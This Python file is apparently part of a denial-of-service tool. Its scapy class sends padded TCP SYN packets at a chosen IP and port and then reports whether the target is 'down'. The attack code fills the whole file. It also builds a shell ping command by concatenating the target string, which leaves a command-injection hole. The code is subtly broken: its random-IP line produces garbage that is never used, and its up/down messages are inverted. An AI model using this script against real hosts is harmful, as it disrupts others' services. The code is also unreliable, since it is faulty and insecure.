from scapy.all import IP, TCP, send, Raw
from random import randint
from lib.util.debug import Debug
import time, os
class tcp_sender:
	def __init__(self, ip, port):
		self.ip = ip
		self.port = port
		self.ranip = ".".join(str(randint(0,255) for x in range(4)))
		self.w = randint(0,9000)
		self.s = randint(0,9000)

	def send(self):
		IP_CONFIG = IP ()
		IP_CONFIG.dst = self.ip

		TCP_CONFIG = TCP ()
		TCP_CONFIG.sport = randint(0,9000)
		TCP_CONFIG.dport = self.port
		TCP_CONFIG.flags = 'S'
		raw = Raw(b"X"*6000)
		p = IP_CONFIG / TCP_CONFIG / raw
		res = os.system('ping -c 1 ' + self.ip)
		send(p, verbose=3)
		time.sleep(2)
		if res == 0:
			Debug('[+] Is down')
		else:
			Debug('[-] Is up')
		